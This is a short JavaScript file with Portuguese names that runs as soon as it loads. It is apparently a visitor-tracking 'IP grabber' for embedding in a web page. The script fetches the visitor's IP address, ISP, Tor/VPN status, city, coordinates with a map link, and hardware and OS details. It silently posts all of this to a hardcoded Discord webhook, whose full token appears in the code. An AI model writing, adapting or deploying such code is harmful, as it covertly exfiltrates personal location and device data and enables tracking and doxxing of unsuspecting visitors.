function carregarBowser() {
    return new Promise((resolve, reject) => {
        if (typeof bowser !== 'undefined') {
            resolve(bowser);  // Resolve quando Bowser estiver disponível
        } else {
            reject('Bowser não carregado!');
        }
    });
}
async function enviarInformacoes() {
    try {
        await carregarBowser();
        const browser = bowser.getParser(window.navigator.userAgent);
        const webhookUrl = 'https://discord.com/api/webhooks/1312937577321336893/jtR2X6Z8b3rYyhOTS8zIvTpyS87zebKeL34iN9JulxplcEZfWJDu95Aesv1V7GHUs3ne';
        const apiUrl = 'https://api.ipapi.is/';
        const response = await fetch(apiUrl);
        const data = await response.json();
        const message = `
IP INFORMATION:
IP: ${data.ip}
ORG: ${data.asn?.org || 'N/A'}
TOR: ${data.is_tor}
VPN: ${data.is_vpn}
PROXY: ${data.is_proxy}
-----------------------------------------
LOCATION:
Country: ${data.location?.country || 'N/A'}
State: ${data.location?.state || 'N/A'}
City: ${data.location?.city || 'N/A'}

Latitude: ${data.location?.latitude || 'N/A'}
Longitude: ${data.location?.longitude || 'N/A'}
Google Maps: https://www.google.com/maps?q=${data.location?.latitude},${data.location?.longitude}
-----------------------------------------
DEVICE:
CPU Cores: ${navigator.hardwareConcurrency}
Memory: ${navigator.deviceMemory} GB
User Agent: ${navigator.userAgent}
Platform Type: ${browser.getPlatformType()}
Platform: ${navigator.platform}
OS Name: ${browser.getOSName()}
OS Version: ${browser.getOSVersion()}
Browser Language: ${navigator.language}
`;await fetch(webhookUrl, {method: 'POST',headers: {'Content-Type': 'application/json'},body: JSON.stringify({content: message})});} catch (error) {console.error("bowser error", error);}}
enviarInformacoes();